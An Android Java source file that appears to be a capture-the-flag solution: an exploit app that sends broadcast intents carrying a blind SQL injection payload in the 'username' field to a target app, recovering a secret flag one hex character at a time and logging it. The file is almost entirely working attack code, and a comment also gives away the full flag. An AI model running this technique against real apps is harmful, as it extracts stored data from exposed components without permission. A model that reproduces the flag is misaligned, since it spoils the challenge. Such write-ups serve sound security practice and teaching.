package com.example.bobbyapplication_exploit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    // 逐位碰撞，0-9 a-f
    // ctf{An injection is all you need to get this flag - 5ce61c6e2ce52b614aa923ea97008da4}
    private final String flagPrefix = "ctf{An injection is all you need to get this flag - ";

    private char currentChar = '0';
    private int index = flagPrefix.length() + 1;
    private String flag = "";

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.w("exploit", "Starting exploit...");

        // action：com.bobbytables.ctf.myapplication_OUTPUTINTENT
        IntentFilter intentFilter = new IntentFilter("com.bobbytables.ctf.myapplication_OUTPUTINTENT");
        registerReceiver(new Receiver(), intentFilter);

        getNextFlagCharacter();
    }

    private void getNextFlagCharacter() {
        // 每次取1位
        String injection = "\" or substr(flag," + index + ",1)=\"" + currentChar + "\" --";
        Intent intent = new Intent("com.bobbytables.ctf.myapplication_INTENT");
        intent.putExtra("username", injection);
        intent.putExtra("password", "");
        sendBroadcast(intent);
    }

    private class Receiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String msg = intent.getStringExtra("msg");
            boolean result = msg.equals("Incorrect password");

            if (!result) {
                if (currentChar == '9') {
                    currentChar = 'a';
                } else {
                    // a-f和0-9
                    if(currentChar != 'f')
                        currentChar++;
                }
                getNextFlagCharacter();
                return;
            }

            flag += currentChar;
            currentChar = '0';
            index++;
            if (index < flagPrefix.length() + 32 + 1) {
                getNextFlagCharacter();
            } else {
                Log.w("exploit", flagPrefix + flag + "}");
            }
        }
    }

}
